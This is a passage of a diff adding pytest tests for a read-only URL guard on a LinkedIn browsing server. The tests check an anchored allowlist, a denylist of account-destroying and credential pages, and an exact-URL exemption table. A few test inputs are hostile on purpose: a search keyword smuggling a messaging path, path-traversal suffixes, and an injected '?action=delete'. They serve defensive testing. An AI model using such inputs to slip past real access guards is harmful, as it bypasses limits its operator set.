+    # written: ``linkedin_who_viewed_me`` has MEASURED that loading a third
+    # party's profile leaves them a durable record, so a pattern that can
+    # address anybody but him is refused on that ground alone.
+    "https://www.linkedin.com/in/alex-r-12ab34/edit/intro/",
+    # THE SPELLING THE ALLOWLIST PATTERN ADMITS AND THE EXEMPTION DOES NOT,
+    # recorded rather than left for somebody to trip over. The pattern ends
+    # ``intro/?$`` so the slashless form matches it; the exemption is keyed on
+    # the EXACT url the census builds, which carries the trailing slash. So
+    # this one is refused by the forbidden gate. That is the conservative
+    # direction -- a narrower exemption than the pattern, never a wider one.
+    "https://www.linkedin.com/in/me/edit/intro",
+    # THE REST OF /mypreferences/d/. ``dark-mode`` is ONE named page and the
+    # family is not admitted with it: the two settings pages that were
+    # considered and refused would each have needed ``"/settings/"`` narrowed,
+    # and the category pages carry the toggles.
+    "https://www.linkedin.com/mypreferences/d/settings/language",
+    "https://www.linkedin.com/mypreferences/d/settings/autoplay-videos",
+    "https://www.linkedin.com/mypreferences/d/categories/account",
+    "https://www.linkedin.com/mypreferences/d/dark-mode/extra",
+    "https://www.linkedin.com/mypreferences/d/dark-mode?theme=dark",
+    "https://www.linkedin.com/mypreferences/d/data-privacy",
+    # THE GROUPS FAMILY, WHICH IS EVERYTHING BUT THE ROOT. Added 2026-09-05
+    # alongside the two roots in ALLOWED, and this block is where the
+    # narrowness of that pair is actually asserted -- an ALLOWED entry says a
+    # url opens, and only the refused neighbours say the permission stopped
+    # where it was meant to.
+    #
+    # THE ROSTER IS THE ONE THAT MATTERS. Census row N 165 is a list of people
+    # who did not choose to be enumerated by him, and it was put out of scope
+    # BY NAME. If a future widening ever admits it, this line is what goes
+    # red.
+    "https://www.linkedin.com/groups/12345678/members/",
+    "https://www.linkedin.com/groups/12345678/",
+    "https://www.linkedin.com/groups/12345678/requests/",
+    "https://www.linkedin.com/groups/12345678/about/",
+    "https://www.linkedin.com/groups/discover/",
+    "https://www.linkedin.com/mynetwork/groups/",
+    "https://www.linkedin.com/search/results/groups/?keywords=engineering",
+    # A QUERY STRING ON EITHER ROOT. Neither pattern takes one -- nothing
+    # builds one, so nothing needs preserving, and a pattern that accepts a
+    # query is a pattern that accepts whatever a caller appends.
+    "https://www.linkedin.com/groups/?highlightedUpdateUrn=urn%3Ali%3Aactivity%3A1",
+    "https://www.linkedin.com/events/?tab=recommended",
+    # AND THE WHITESPACE SPELLINGS, because "$" matches before a trailing
+    # newline and the surrounding entries in this list already pay for that
+    # lesson twice.
+    "https://www.linkedin.com/groups/\n",
+    " https://www.linkedin.com/events/",
+    # THE EVENTS FAMILY, WHICH IS ALSO EVERYTHING BUT THE ROOT. The attendee
+    # list (census rows N 188 and N 189) is out of scope by the same ruling
+    # that excluded the group roster; an event page is census row N 184, and
+    # its refusal here is what makes the ledger's "allowlist +1" for this
+    # blocker measurably short.
+    "https://www.linkedin.com/events/12345678901234567890/",
+    "https://www.linkedin.com/events/12345678901234567890/about/",
+    "https://www.linkedin.com/events/12345678901234567890/comments/",
+    "https://www.linkedin.com/mynetwork/network-manager/events/",
+    "https://www.linkedin.com/search/results/events/?keywords=hiring",
+]
+
+
+def test_the_forbidden_gate_is_what_stops_an_edit_url_not_the_allowlist():
+    """Belt and braces, shown to be two separate things.
+
+    ``dom.SKILL_HREF`` matches an inline edit affordance, and the argument that
+    it can never become a navigation rests on ``/edit/`` being refused BEFORE
+    the allowlist is consulted. Both gates refuse this url, so a test that only
+    checked for a raise could not say which -- the message is what distinguishes
+    them, and this pins the forbidden one.
+    """
+    url = "https://www.linkedin.com/in/alex-rivera-8c21/details/skills/edit/forms/2/"
+    with pytest.raises(WriteAttemptError) as caught:
+        readonly.assert_read_url(url)
+    assert "/edit/" in str(caught.value)
+    assert "not a read surface" in str(caught.value)
+
+
+@pytest.mark.parametrize("url", ALLOWED)
+def test_read_surfaces_are_allowed(url: str):
+    assert readonly.assert_read_url(url) == url
+
+
+@pytest.mark.parametrize("url", BLOCKED)
+def test_write_and_foreign_urls_are_blocked(url: str):
+    with pytest.raises(WriteAttemptError):
+        readonly.assert_read_url(url)
+
+
+GROUPS_ROOT = "https://www.linkedin.com/groups/"
+EVENTS_ROOT = "https://www.linkedin.com/events/"
+GROUP_MEMBER_ROSTER = "https://www.linkedin.com/groups/12345678/members/"
+GROUP_INVITE = "https://www.linkedin.com/groups/12345678/invite/"
+
+
+def test_the_two_membership_roots_are_admitted_and_their_families_are_not():
+    """The 2026-09-05 widening, asserted in both directions at once.
+
+    An ALLOWED entry says a url opens. It says nothing about where the
+    permission stopped, and where it stopped is the whole of what was ruled:
+    HIS OWN memberships yes, a directory of other people no.
+    """
+    assert readonly.is_read_url(GROUPS_ROOT)
+    assert readonly.is_read_url(EVENTS_ROOT)
+    for url in (
+        GROUP_MEMBER_ROSTER,
+        "https://www.linkedin.com/groups/12345678/",
+        "https://www.linkedin.com/events/12345678901234567890/",
+        "https://www.linkedin.com/events/12345678901234567890/comments/",
+    ):
+        assert not readonly.is_read_url(url), url
+
+
+def test_the_member_roster_is_refused_by_ONE_gate_and_the_count_is_the_point():
+    """A DISCLOSURE, NOT A REASSURANCE, and it is why this test is named this.
+
+    ``/groups/<id>/invite/`` is refused TWICE -- by the ``/invite`` substring
+    and by the anchored allowlist -- so census rows N 166 and C 69 need two
+    boundary changes rather than one.
+
+    **The member roster is refused ONCE.** It carries no forbidden substring
+    at all: ``members`` is not on the denylist and neither is anything else in
+    that url. The ONLY thing standing between this server and a list of people
+    who did not choose to be enumerated by him is the fact that the pattern
+    two lines away is anchored to the root.
+
+    That is a true statement about a boundary and it is the kind that gets
+    lost. It is asserted here so that anyone widening ``/groups/`` later finds
+    out from a red test rather than from the roster arriving in an answer.
+    """
+    invite_substrings = [
+        substring
+        for substring in readonly._FORBIDDEN_URL_SUBSTRINGS
+        if substring in GROUP_INVITE.lower()
+    ]
+    assert invite_substrings == ["/invite"], invite_substrings
+    assert not any(
+        pattern.match(GROUP_INVITE) for pattern in readonly._ALLOWED_URL_PATTERNS
+    ), "the invite url now matches an allow pattern -- it was refused by both"
+
+    roster_substrings = [
+        substring
+        for substring in readonly._FORBIDDEN_URL_SUBSTRINGS
+        if substring in GROUP_MEMBER_ROSTER.lower()
+    ]
+    assert roster_substrings == [], (
+        "a forbidden substring now fires on the member roster. That is not a "
+        "failure -- it is a SECOND gate arriving where there was one -- but "
+        "this test's whole claim is the count, so update the claim rather "
+        f"than deleting the assertion. Fired: {roster_substrings}"
+    )
+    assert not readonly.is_read_url(GROUP_MEMBER_ROSTER)
+
+
+def test_the_anchor_is_what_refuses_the_roster_SHOWN_FAILING():
+    """Plant the widening a future reader is most likely to write.
+
+    The obvious "improvement" to the groups entry is to let it reach a group
+    -- ``^.../groups/.*$`` -- and the point of this test is that the roster
+    falls out of the same edit, silently, because nothing else refuses it.
+    A guard that has not been shown failing certifies nothing.
+    """
+    original = readonly._ALLOWED_URL_PATTERNS
+    assert not readonly.is_read_url(GROUP_MEMBER_ROSTER)
+    try:
+        readonly._ALLOWED_URL_PATTERNS = original + (
+            re.compile(r"^https://www\.linkedin\.com/groups/.*$"),
+        )
+        assert readonly.is_read_url(GROUP_MEMBER_ROSTER), (
+            "the roster is STILL refused with a wildcard groups pattern "
+            "installed, so something other than the anchor is refusing it "
+            "and this test is measuring the wrong thing"
+        )
+    finally:
+        readonly._ALLOWED_URL_PATTERNS = original
+    assert not readonly.is_read_url(GROUP_MEMBER_ROSTER)
+
+
+def test_neither_new_root_carries_a_query_or_a_subpath():
+    """The anchoring, asserted rather than described.
+
+    Both patterns end ``/?$``. Nothing in this package builds a query for
+    either address, so a pattern that accepted one would be accepting whatever
+    a caller appended.
+    """
+    for root in (GROUPS_ROOT, EVENTS_ROOT):
+        assert readonly.is_read_url(root)
+        assert readonly.is_read_url(root.rstrip("/"))
+        assert not readonly.is_read_url(root + "?tab=recommended")
+        assert not readonly.is_read_url(root + "anything/")
+
+
+def test_the_tracker_allowlist_admits_three_stages_and_no_more():
+    """THE THIRD STAGE, and the evidence that admitting it stayed narrow.
+
+    ``?stage=draft`` was added on 2026-08-26 so the In Progress list could be
+    read at all. The hazard in that edit is not the stage it names -- it is
+    the shape the NEXT person reaches for: one ``[a-z_]+`` where the
+    alternation is, and every stage LinkedIn has becomes openable, including
+    the ones this server has no business on.
+
+    So both halves are pinned. The permitted set is asserted EXACTLY, and each
+    refused stage is named rather than left to a wildcard's absence: a test
+    that only checked the three permitted ones would pass unchanged against
+    ``(saved|applied|draft|interview|archived|clicked_apply)``.
+    """
+    from linkedin_server.config import BASE_URL
+
+    permitted = {"saved", "applied", "draft"}
+    refused = {"interview", "archived", "clicked_apply", "withdraw", "in_progress"}
+    assert permitted & refused == set()
+
+    for stage in sorted(permitted):
+        url = f"{BASE_URL}/jobs-tracker/?stage={stage}"
+        assert readonly.is_read_url(url), stage
+
+    for stage in sorted(refused):
+        url = f"{BASE_URL}/jobs-tracker/?stage={stage}"
+        assert not readonly.is_read_url(url), stage
+
+    # SHOWN NOT PASSING VACUOUSLY, which for a refusal test is the whole
+    # question. Every refused url above matches the wildcard somebody might
+    # reach for, so the ENUMERATION is the only thing standing between this
+    # server and all five -- and the loop above is what fails on the day it
+    # stops being an enumeration.
+    wildcard = re.compile(r"^https://www\.linkedin\.com/jobs-tracker/\?stage=[a-z_]+$")
+    for stage in sorted(refused):
+        assert wildcard.match(f"{BASE_URL}/jobs-tracker/?stage={stage}"), stage
+
+
+def test_the_two_ruled_surfaces_are_admitted_and_their_families_are_not():
+    """THE 2026-08-31 RULING, and the evidence that admitting it stayed narrow.
+
+    Two urls were ruled readable: the intro editor on his own profile, and ONE
+    named settings page. The hazard in both is the same one the tracker stages
+    have -- the shape the next person reaches for. For the editor it is
+    ``/in/[A-Za-z0-9-]+/edit/intro/``, which reads like the neighbourly
+    generalisation and is the one thing that must never be written: this
+    server has MEASURED, on ``linkedin_who_viewed_me``, that loading a third
+    party's profile leaves them a durable record. ``/in/me/`` redirects to
+    whoever is signed in, so it can only ever reach him. For the settings page
+    it is ``/mypreferences/d/[a-z-]+``, which would admit the two addresses in
+    the BLOCKED list above that can end an account.
+
+    So both halves are pinned: the pair is admitted, and each family member
+    that is not is named rather than left to a wildcard's absence.
+    """
+    assert readonly.is_read_url("https://www.linkedin.com/in/me/edit/intro/")
+    assert readonly.is_read_url("https://www.linkedin.com/mypreferences/d/dark-mode")
+
+    for refused in (
+        "https://www.linkedin.com/in/me/edit/",
+        "https://www.linkedin.com/in/me/edit/topcard/",
+        "https://www.linkedin.com/in/alex-r-12ab34/edit/intro/",
+        "https://www.linkedin.com/mypreferences/d/settings/language",
+        "https://www.linkedin.com/mypreferences/d/settings/autoplay-videos",
+        "https://www.linkedin.com/mypreferences/d/categories/account",
+        "https://www.linkedin.com/mypreferences/d/close-accounts",
+        "https://www.linkedin.com/mypreferences/d/hibernate-account",
+    ):
+        assert not readonly.is_read_url(refused), refused
+
+    # SHOWN NOT PASSING VACUOUSLY, which for a refusal test is the whole
+    # question. Every refused address above matches the pattern somebody would
+    # reach for, so the loop is what fails on the day one of them is written.
+    tempting = (
+        re.compile(r"^https://www\.linkedin\.com/in/[A-Za-z0-9\-_%]+/edit/intro/?$"),
+        re.compile(r"^https://www\.linkedin\.com/mypreferences/d/[a-z\-/]+$"),
+    )
+    for refused in (
+        "https://www.linkedin.com/in/alex-r-12ab34/edit/intro/",
+        "https://www.linkedin.com/mypreferences/d/close-accounts",
+        "https://www.linkedin.com/mypreferences/d/hibernate-account",
+        "https://www.linkedin.com/mypreferences/d/settings/language",
+    ):
+        assert any(pattern.match(refused) for pattern in tempting), refused
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "https://www.linkedin.com/mypreferences/d/close-accounts",
+        "https://www.linkedin.com/mypreferences/d/hibernate-account",
+    ],
+)
+def test_the_two_account_destroying_addresses_are_refused_by_the_denylist(url):
+    """WHICH GATE REFUSES, because the refusal itself never changed.
+
+    Both addresses were refused before 2026-08-31 and both are refused now, so
+    a test that only checked for a raise would pass identically across the
+    change and certify nothing about it. What changed is the GATE. The
+    settings audit assumed "Close and delete account" and "Hibernate account"
+    were covered by the ``/mypreferences/d/categories/`` entry; measured off a
+    live census that day, their real addresses are
+    ``/mypreferences/d/close-accounts`` and
+    ``/mypreferences/d/hibernate-account`` and NEITHER contains ``categories/``.
+    The only thing that had ever refused them was the anchored allowlist.
+
+    ``readonly.py`` documents its substring list as a "second, independent
+    gate ... belt and braces", and for the two most destructive addresses on
+    the account there was no second gate at all. This asserts that there is
+    one, by the message -- which is the only thing that tells the two gates
+    apart.
+    """
+    with pytest.raises(WriteAttemptError) as caught:
+        readonly.assert_read_url(url)
+    message = str(caught.value)
+    assert "not a read surface" in message, message
+    assert "not on the read-only allowlist" not in message, message
+    # And the substring itself, so the test cannot pass on some other entry
+    # happening to match.
+    expected = "/close-accounts" if "close" in url else "/hibernate-account"
+    assert repr(expected) in message, message
+    assert expected in readonly._FORBIDDEN_URL_SUBSTRINGS
+
+
+def test_the_exemption_table_is_exactly_one_url_for_exactly_one_substring():
+    """The allowlist inside the denylist, read out loud.
+
+    ``_FORBIDDEN_SUBSTRING_EXEMPTIONS`` is the second structure in this module
+    that GRANTS rather than refuses, and a granting list that is only checked
+    for "does it cover what we needed" grows an entry at a time with nobody
+    noticing. So the CONTENTS are pinned here, the way
+    ``SANCTIONED_MUTATIONS`` is pinned above: one url, one substring, both
+    spelled out.
+
+    The value is checked too, not just the key. An entry mapped to ``/delete``
+    would buy past a different gate entirely while looking identical in a
+    listing of keys.
+    """
+    assert readonly._FORBIDDEN_SUBSTRING_EXEMPTIONS == {
+        "https://www.linkedin.com/in/me/edit/intro/": "/edit/",
+        # THE SECOND ENTRY, 2026-08-31, on the operator's ruling admitting the
+        # message composer. It is here rather than being bought by shortening
+        # the forbidden tuple, which is the difference that matters: every
+        # other spelling under /messaging/compose is refused by the same gate
+        # it always was, because this key is an EQUALITY and not a prefix.
+        "https://www.linkedin.com/messaging/compose/": "/messaging/compose",
+    }
+    # The exempted substring must really be on the forbidden list; an
+    # exemption for a substring nobody forbids is a dead entry that reads like
+    # a live permission.
+    for substring in readonly._FORBIDDEN_SUBSTRING_EXEMPTIONS.values():
+        assert substring in readonly._FORBIDDEN_URL_SUBSTRINGS, substring
+    # And the key must be stored lowercased, because that is what it is
+    # compared against.
+    for key in readonly._FORBIDDEN_SUBSTRING_EXEMPTIONS:
+        assert key == key.lower(), key
+
+
+def test_an_exemption_buys_past_one_substring_and_not_a_second(monkeypatch):
+    """THE PER-SUBSTRING PROPERTY, shown on a url that carries two.
+
+    The real table has one entry and that url contains one forbidden
+    substring, so the property cannot be demonstrated on live data -- and a
+    property that cannot be demonstrated is one a later refactor can drop
+    without a single test going red. So the table is replaced with a hostile
+    one: a url exempted for ``/edit/`` that ALSO contains ``/delete``.
+
+    The exemption is per-substring, so ``/delete`` still refuses it. An
+    implementation that exempted the URL rather than the PAIR would let this
+    through, which is the whole reason the value in that dict is a substring
+    and not a ``True``.
+    """
+    hostile = "https://www.linkedin.com/in/me/edit/intro/delete"
+    monkeypatch.setattr(
+        readonly,
+        "_FORBIDDEN_SUBSTRING_EXEMPTIONS",
+        {hostile: "/edit/"},
+    )
+    with pytest.raises(WriteAttemptError) as caught:
+        readonly.assert_read_url(hostile)
+    message = str(caught.value)
+    assert "'/delete'" in message, message
+    assert "not a read surface" in message, message
+
+
+def test_the_exemption_does_not_buy_past_the_allowlist(monkeypatch):
+    """ONE GATE, NEVER BOTH.
+
+    An exemption is permission to carry a forbidden substring. It is not
+    permission to be opened -- the anchored allowlist still has to admit the
+    url afterwards. Shown on a third party's intro editor, which is exactly
+    the url an over-broad exemption would reach: with the substring gate
+    bought past, the refusal has to come from the allowlist, and the message
+    is what proves it did.
+    """
+    stranger = "https://www.linkedin.com/in/alex-r-12ab34/edit/intro/"
+    monkeypatch.setattr(
+        readonly,
+        "_FORBIDDEN_SUBSTRING_EXEMPTIONS",
+        {stranger: "/edit/"},
+    )
+    with pytest.raises(WriteAttemptError) as caught:
+        readonly.assert_read_url(stranger)
+    assert "not on the read-only allowlist" in str(caught.value), str(caught.value)
+
+
+def test_the_exemption_is_matched_with_equality_and_never_as_a_prefix():
+    """``==``, and the control that shows what ``startswith`` would have cost.
+
+    ``writes.WriteSpec.exempt_substring`` states the discipline this mirrors:
+    "Compared with ``==`` against the entry in the forbidden list -- never as
+    a shape, because a loose exemption is how a real write hides." The same
+    applies one level up, to the url.
+
+    Every url below has the exempted url as a PREFIX and is a different
+    address. Each is refused -- but so is every one of them under a
+    ``startswith`` lookup, because the allowlist pattern is anchored and no
+    suffix can match it. A test that only asserted the refusal would therefore
+    pass identically against both implementations and certify nothing.
+
+    WHAT DISTINGUISHES THEM IS WHICH GATE REFUSES. Under ``==`` none of these
+    is exempted, so the ``/edit/`` entry stops all four and says so. Under a
+    prefix lookup all four would be waved past ``/edit/`` and would be stopped
+    later or elsewhere -- by the allowlist, or by ``action=``, or by
+    ``/delete``. So the message is the instrument, exactly as it is for the
+    two account-ending addresses above.
+    """
+    exempted = "https://www.linkedin.com/in/me/edit/intro/"
+    assert readonly.is_read_url(exempted)
+
+    escapes = (
+        exempted + "../../evil",
+        exempted + "?action=delete",
+        exempted + "delete",
+        exempted + "forms/next-action/",
+    )
+    for url in escapes:
+        with pytest.raises(WriteAttemptError) as caught:
+            readonly.assert_read_url(url)
+        assert "'/edit/'" in str(caught.value), (url, str(caught.value))
+
+    # AND THE PREFIX RELATION HOLDS, so the paragraph above is about this code
+    # and not about four urls that happen not to be prefixes at all.
+    for url in escapes:
+        assert any(
+            url.lower().startswith(key)
+            for key in readonly._FORBIDDEN_SUBSTRING_EXEMPTIONS
+        ), url
+
+
+def test_a_keyword_cannot_smuggle_a_forbidden_path_into_a_search_url():
+    """Tool arguments reach the url builder; the allowlist is what stops them."""
+    hostile = (
+        "https://www.linkedin.com/jobs/search/?keywords=x"
+        "#/../messaging/thread/2-abc/"
+    )
+    # The fragment cannot escape the allowlist pattern, which is anchored.
+    with pytest.raises(WriteAttemptError):
+        readonly.assert_read_url(hostile)
+
+
+# ---------------------------------------------------------------------------
+# 4. Every url the server builds is a permitted read surface
+# ---------------------------------------------------------------------------
+
+
+def test_the_urls_the_server_actually_builds_all_pass_the_allowlist():
+    from linkedin_server.config import BASE_URL, FEED_URL, LOGIN_URL
+
+    built = [
+        f"{BASE_URL}/analytics/profile-views/",
+        f"{BASE_URL}/me/profile-views/",
+        f"{BASE_URL}/jobs-tracker/?stage=applied",
+        f"{BASE_URL}/jobs-tracker/?stage=saved",
+        f"{BASE_URL}/jobs-tracker/?stage=draft",
+        f"{BASE_URL}/in/me/",
+        # CORRECTED 2026-09-04, and this list's NAME is the reason it
+        # mattered: it claims to hold the urls the server ACTUALLY
+        # builds, and this entry had not been one since 2026-09-03. A
+        # fixture that names a capability it no longer describes passes
+        # for exactly as long as nothing else moves.
+        f"{BASE_URL}/in/me/details/skills/",
+        f"{BASE_URL}/notifications/",
+        f"{BASE_URL}/mypreferences/d/",
+        # THE TWO CENSUS SURFACES ADDED 2026-08-31. Both are built in
+        # server.py's CENSUS_SURFACES and both had to be admitted deliberately.
+        f"{BASE_URL}/in/me/edit/intro/",
+        f"{BASE_URL}/mypreferences/d/dark-mode",
+        FEED_URL,
+        LOGIN_URL,
+    ]
+    for url in built:
+        assert readonly.is_read_url(url), url
+
+
+def test_that_list_is_the_urls_the_server_really_builds():
+    """The list above is hand-written, so it can go stale -- and it did.
+
+    It still named ``/my-items/saved-jobs/?cardType=...`` for a release after
+    the server stopped building it, and never named the tracker urls that
+    replaced them, so the one line this change added to the allowlist was
+    covered by nothing. This reads the f-string literals out of ``server.py``
+    instead of trusting the list.
+    """
+    source = (Path(readonly.__file__).resolve().parent / "server.py").read_text(
+        encoding="utf-8"
+    )
+    built_paths = set(re.findall(r'f"\{BASE_URL\}(/[^"?]*)', source))
+    assert "/jobs-tracker/" in built_paths, built_paths
+    assert "/my-items/saved-jobs/" not in built_paths, (
+        "server.py still builds the retired saved-jobs url"
+    )
+
+# ---------------------------------------------------------------------------
+# 6. The denylist's DIRECTION, and the addresses it is supposed to catch
+# ---------------------------------------------------------------------------
+#
+# WHY THESE LIVE HERE AND NOT IN test_readonly_boundary_invariant.py, where
+# they were first written. That file freezes the boundary by reading
+# readonly.py AS TEXT and hashing its AST -- deliberately, so the freeze does
+# not depend on importing the thing it is policing. These two checks need the
+# opposite: the live tuple and the live function. They are behaviour, and
+# behaviour is what this file is for.
+
+#: Every substring that has EVER been on ``_FORBIDDEN_URL_SUBSTRINGS``.
+#:
+#: A ROSTER, NOT A SNAPSHOT, and the difference is the point. The digests
+#: above answer "did this list change"; they cannot answer "did it change in
+#: the safe direction", and for a denylist that is the only question worth
+#: asking. This one is a SUBSET assertion, so a growing list keeps passing
+#: without an edit and a shrinking one cannot.
+#:
+#: An entry leaves this roster only if somebody deliberately deletes it here,
+#: in the same commit that deletes it from the boundary, having written down
+#: why an address this repository once refused should now be reachable.
+FORBIDDEN_SUBSTRINGS_EVER = (
+    "/jobs/application",
+    "easyapply",
+    "easy-apply",
+    # NARROWED 2026-08-26 from a blanket "/messaging" to the compose surface
+    # alone, on the operator's ruling that reading his own inbox is his to do.
+    # That narrowing PREDATES this roster, so the blanket entry is not on it;
+    # what is on it is the entry that survived, which is the one that keeps
+    # sending impossible.
+    "/messaging/compose",
+    "/invite",
+    "invitation",
+    "/connect",
+    "/follow",
+    "/unfollow",
+    "/endorse",
+    "/post/",
+    "/feed/update",
+    "sharing/share",
+    "/settings/",
+    "opentowork",
+    "open-to-work",
+    # Added 2026-08-30 with the settings-index census. See readonly.py.
+    "/mypreferences/d/categories/",
+    "/psettings/",
+    "/edit/",
+    "action=",
+    "/delete",
+    "/withdraw",
+    # ADDED 2026-08-31, and they join the roster on the day they join the
+    # boundary because they close a hole rather than tidy one. The settings
+    # audit assumed the two account-ending pages were covered by
+    # ``/mypreferences/d/categories/``; measured off a live census, they are
+    # at ``/mypreferences/d/close-accounts`` and
+    # ``/mypreferences/d/hibernate-account`` and neither contains
+    # ``categories/``. They had no second gate at all.
+    "/close-accounts",
+    "/hibernate-account",
+    # ADDED 2026-09-03, ten of them, and they are on this roster the day they
+    # join the boundary for the same reason the two above are: they close a
+    # hole rather than tidy one.
+    #
+    # WHAT THE HOLE WAS. The two entries above, and the two before them, were
+    # each written after ONE surface was found with no second gate. Asked
+    # mechanically instead -- which addresses does the anchored allowlist
+    # refuse ALONE? -- ten came back, and what they have in common is that
+    # THIS LIST WAS ANCHORED TO PATH SPELLINGS ON THE DESKTOP TREE: a second
+    # spelling (``/public-profile/settings``, no trailing slash, which
+    # ``"/settings/"`` does not match), a legacy namespace (``/uas/``), or a
+    # parallel tree (``/mwlite/``, an entire mobile-web mirror) each walked
+    # past it. None was ever reachable; the allowlist held all ten.
+    #
+    # The argument for each entry is on the entry itself in readonly.py, and
+    # ``tests/test_the_second_gate_covers_the_class.py`` is where the CLASS
+    # claim is checked rather than asserted -- it puts an address through the
+    # real guard for every entry here that is not one of the ten.
+    "settings",
+    "/uas/",
+    "/mwlite/",
+    "password",
+    "two-factor",
+    "verification",
+    "cookies",
+    "job-application",
+    "visibility",
+    "/create",
+)
+
+#: THE ONE SUBSTRING THAT HAS EVER LEFT THE FORBIDDEN LIST, and the reason.
+#:
+#: The roster above is asserted as a SUBSET of the live tuple, so a deletion
+#: cannot pass without an edit here. This is that edit, and it is DELIBERATELY
+#: SHAPED AS AN EXCEPTION RATHER THAN A DELETION: the entry stays in
+#: ``FORBIDDEN_SUBSTRINGS_EVER``, because a substring quietly removed from the
+#: roster is indistinguishable from one that was never on it, and the whole
+#: value of that roster is that it remembers.
+#:
+#: ``/feed/update`` was removed on 2026-08-31, on the operator's ruling
+#: admitting ONE NAMED ITEM PERMALINK PER CALL. It could not be kept, and the
+#: reason is mechanical rather than a matter of appetite: this gate matches
+#: SUBSTRINGS, so it cannot say "the permalink but nothing beneath it", and
+#: the exemption table is keyed on an EXACT url while the urn varies per call.
+#: Neither mechanism can express the ruling.
+#:
+#: WHAT WAS AND WAS NOT GIVEN UP, and it is asserted rather than argued --
+#: ``test_the_removed_substring_did_not_take_the_family_with_it`` below puts
+#: the dangerous members of that family through the real guard. ``/edit/``,
+#: ``/delete``, ``/withdraw`` and ``action=`` all remain and all still catch
+#: them. What was given up is a blanket refusal of a surface that renders one
+#: of HIS OWN items.
+#:
+#: An entry here is a boundary decision. Adding a second one means writing
+#: down the same three things: which ruling, why the substring could not be
+#: kept, and what still refuses the rest of its family.
+FORBIDDEN_SUBSTRINGS_DELIBERATELY_REMOVED = {
+    "/feed/update",
+}
+
+#: Addresses that must stay unreadable, whatever the two lists look like.
+#:
+#: THE ROSTER ABOVE IS ABOUT STRINGS; THIS IS ABOUT BEHAVIOUR, and it is the
+#: one that would have caught the defect measured on 2026-08-30. ``/settings/``
+#: sat on the forbidden list for the whole life of this repository and matched
+#: NOTHING LinkedIn serves -- so a roster check on that string passed every
+#: day while the surface it was named for had no second gate at all. A list of
+#: strings cannot notice that; a list of ADDRESSES can.
+#:
+#: Each entry is a real address, put through the real guard.
+MUST_STAY_UNREADABLE = (
+    "https://www.linkedin.com/mypreferences/d/categories/account",
+    "https://www.linkedin.com/psettings/",
+    "https://www.linkedin.com/settings/",
+    # ``https://www.linkedin.com/messaging/compose/`` WAS HERE UNTIL
+    # 2026-08-31 and is now READABLE, by the operator's ruling and by an
+    # exact-url exemption. It is recorded rather than silently dropped, and
+    # what replaces it is the set of neighbours the exemption must NOT have
+    # carried with it -- which is a stronger check than the single entry was,
+    # because the risk was never that one url opened. It was that a family
+    # did.
+    "https://www.linkedin.com/messaging/compose",
+    "https://www.linkedin.com/messaging/compose/new/",
+    "https://www.linkedin.com/messaging/compose/?recipient=someone",
+    "https://www.linkedin.com/mynetwork/invitation-manager/",
+    "https://www.linkedin.com/mynetwork/",
+    # ADDED 2026-09-03, in the commit admitting the CONNECTIONS list. These
+    # are the addresses that must not travel with it, and the entry above --
+    # ``/mynetwork/`` itself -- is the load-bearing one: it was put through a
+    # written side-effect ruling on 2026-08-30 and REFUSED because it consumes
+    # the pending invitation badge. It was already here, so it doubles as the
+    # regression guard for this change at no cost.
+    "https://www.linkedin.com/mynetwork/invite-connect/",
+    "https://www.linkedin.com/mynetwork/invite-connect/invitations/",
+    # THE QUERY AND THE SUB-PATH, which prove the new pattern is anchored and
+    # not a prefix. A query is where a filter naming a person would arrive.
+    "https://www.linkedin.com/mynetwork/invite-connect/connections/?foo=1",
+    "https://www.linkedin.com/mynetwork/invite-connect/connections/x",
+    # THE PEOPLE HE FOLLOWS, recorded on the Manage-Pages allowlist entry as
+    # the sibling nobody may reach for. It carries ``/follow`` and the new
+    # exemption does not excuse that substring for any address.
+    "https://www.linkedin.com/mynetwork/network-manager/people-follow/following/",
+    # PEOPLE SEARCH, which is the GENERAL case where connections is the
+    # specific one. It has no allowlist pattern and no written reason, and the
+    # lead ruled it a SEPARATE decision rather than part of this one. Pinned
+    # here so that admitting it later is a deliberate edit to this table
+    # rather than a side effect of some other widening.
+    'https://www.linkedin.com/search/results/people/?network=%5B%22F%22%5D',
+    "https://www.linkedin.com/company/example-co/",
+    "https://www.linkedin.com/feed/following/",
+    "https://www.linkedin.com/in/me/edit/",
+    # ADDED 2026-08-31, in the commit that admitted ONE url out of each of two
+    # families. These are the addresses that must not travel with it -- the
+    # two that can end the account, the rest of his own editor, another
+    # member's editor, and the escape that proves the exemption is an
+    # equality and not a prefix.
+    "https://www.linkedin.com/mypreferences/d/close-accounts",
+    "https://www.linkedin.com/mypreferences/d/hibernate-account",
+    "https://www.linkedin.com/mypreferences/d/settings/language",
+    "https://www.linkedin.com/in/me/edit/topcard/",
+    "https://www.linkedin.com/in/alex-r-12ab34/edit/intro/",
+    "https://www.linkedin.com/in/me/edit/intro/../../evil",
+    # ADDED 2026-09-03, with the class close. THESE ARE THE ADDRESSES, and
+    # this list is the half of that change that keeps working if every
+    # substring is later rewritten -- which is the lesson of the comment at
+    # the top of this tuple, where a string sat on the forbidden list for the
+    # life of the repository while catching nothing.
+    #
+    # The account's password and its second authentication factor lead,
+    # because they are the two members that make the asymmetry worth the
+    # paragraph it got.
+    "https://www.linkedin.com/mypreferences/d/change-password",
+    "https://www.linkedin.com/mypreferences/d/two-factor-authentication",
+    "https://www.linkedin.com/mypreferences/d/verifications",
+    "https://www.linkedin.com/mypreferences/d/member-cookies",
+    "https://www.linkedin.com/mypreferences/d/job-application-accounts",
+    "https://www.linkedin.com/mypreferences/d/profile-visibility-for-partners",
+    # BOTH SPELLINGS OF ONE SURFACE. The trailing-slash form was refused all
+    # along, by ``"/settings/"``; the slashless form is the one that reached
+    # the allowlist and nothing else, and a pair recorded here is what stops
+    # the distinction being lost again.
+    "https://www.linkedin.com/public-profile/settings",
+    "https://www.linkedin.com/public-profile/settings/",
+    # THE LEGACY AUTH NAMESPACE and THE PARALLEL MOBILE TREE, one address
+    # each. The tree entry closes an unbounded family; these two are the
+    # members that exposed it.
+    "https://www.linkedin.com/uas/login",
+    "https://www.linkedin.com/mwlite/settings",
+    "https://www.linkedin.com/badges/profile/create",
+)
+
+
+
+
+
+def test_the_forbidden_list_has_only_ever_grown():
+    """THE DIRECTION, which no digest above can report.
+
+    A digest says the forbidden list is not what it was. It says nothing about
+    which way, and the two directions are not remotely equivalent: adding a
+    substring refuses more, removing one makes an address reachable that this
+    repository had decided was not. Re-baselining a digest is the same edit in
+    both cases.
+
+    So the roster is asserted as a SUBSET. Growth needs no edit here; a
+    deletion cannot pass without one, and making that edit means writing down
+    why an address once refused should now be readable.
+    """
